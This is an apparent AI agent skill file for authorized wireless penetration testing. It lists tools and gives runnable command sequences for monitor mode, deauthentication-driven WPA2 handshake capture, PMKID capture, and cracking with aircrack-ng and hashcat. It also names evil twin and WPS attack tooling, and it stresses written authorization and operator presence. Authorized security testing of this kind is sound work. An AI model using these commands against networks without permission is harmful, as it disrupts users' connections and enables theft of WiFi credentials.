---
name: wireless-recon
description: >
  Wireless network security testing including WiFi enumeration, WPA/WPA2/WPA3
  cracking, rogue AP detection, Bluetooth reconnaissance, and RF analysis
  for authorized security engagements. Use this skill whenever the user
  mentions wireless testing, WiFi security, WiFi cracking, WPA cracking,
  aircrack-ng, airmon-ng, aireplay-ng, airodump-ng, wifite, reaver, WPS
  attack, pixie dust, evil twin, rogue access point, deauthentication,
  handshake capture, PMKID capture, Bluetooth scanning, BLE security,
  wireless pentest, or any wireless-focused security testing task.
  CRITICAL: Wireless testing requires physical proximity and appropriate
  hardware. The AI generates commands — the OPERATOR executes them in person.
  All wireless testing requires explicit written authorization.
compatibility:
  tools: [bash]
  mcps: [desktop-commander]
  skills: [scope-guard, credential-attack, audit-logger]
---

# Wireless Recon Skill

## Overview

Generates commands and methodology for wireless security testing. The AI
CANNOT execute wireless attacks directly — these require physical hardware
and proximity. This skill provides command sequences, methodology guidance,
and result analysis for an operator performing wireless testing in the field.

## ⚠️ Physical Requirements

- Monitor-mode capable wireless NIC (Alfa AWUS036ACH, TP-Link TL-WN722N v1)
- Physical proximity to target wireless network
- Written authorization for wireless testing specifically
- Operator present at all times

## Expert Tool Map

| Task | Tool | Notes |
|------|------|-------|
| Interface management | **airmon-ng** | Enable monitor mode |
| Network discovery | **airodump-ng** | Capture BSSIDs, clients, channels |
| WPA handshake capture | **airodump-ng** + **aireplay-ng** | Deauth + capture |
| PMKID capture | **hcxdumptool** | No client needed |
| WPA cracking | **hashcat** (GPU) / **aircrack-ng** | See credential-attack |
| WPS attack | **reaver** / **bully** | Pixie dust + brute force |
| Automated WiFi testing | **wifite** | All-in-one (less control) |
| Rogue AP / Evil Twin | **hostapd** + **dnsmasq** | Requires 2nd interface |
| Bluetooth scanning | **bluetoothctl** / **hcitool** | BLE: **bettercap** |
| Packet analysis | **wireshark** / **tshark** | Post-capture analysis |

## Core Command Sequences (for operator execution)

### WiFi Enumeration
```bash
# Enable monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0
# Interface is now wlan0mon

# Scan all networks
sudo airodump-ng wlan0mon
# Note target BSSID, channel, encryption type

# Focus on target network
sudo airodump-ng -c {channel} --bssid {target_bssid} -w /tmp/capture wlan0mon
```

### WPA2 Handshake Capture
```bash
# In terminal 1: capture
sudo airodump-ng -c {channel} --bssid {target_bssid} -w /tmp/handshake wlan0mon

# In terminal 2: deauth a client to force reconnection
sudo aireplay-ng -0 5 -a {target_bssid} -c {client_mac} wlan0mon
# Wait for "WPA handshake: XX:XX:XX:XX:XX:XX" in terminal 1

# Crack with aircrack-ng (CPU)
aircrack-ng -w /usr/share/wordlists/rockyou.txt /tmp/handshake-01.cap

# OR convert for hashcat (GPU — faster)
hcxpcapngtool -o /tmp/hash.hc22000 /tmp/handshake-01.cap
hashcat -m 22000 /tmp/hash.hc22000 /usr/share/wordlists/rockyou.txt
```

### PMKID Capture (clientless)
```bash
hcxdumptool -i wlan0mon -o /tmp/pmkid.pcapng --filterlist_ap={target_bssid} --filtermode=2
hcxpcapngtool -o /tmp/pmkid.hc22000 /tmp/pmkid.pcapng
hashcat -m 22000 /tmp/pmkid.hc22000 /usr/share/wordlists/rockyou.txt
```

## Output Checklist

- [ ] Written wireless testing authorization confirmed
- [ ] Physical hardware available and tested
- [ ] Target network identified (BSSID, channel, encryption)
- [ ] Handshake/PMKID captured successfully
- [ ] Cracking attempted (hand off to credential-attack for GPU cracking)
- [ ] All activities logged with timestamps
- [ ] Operator physically present for all wireless operations
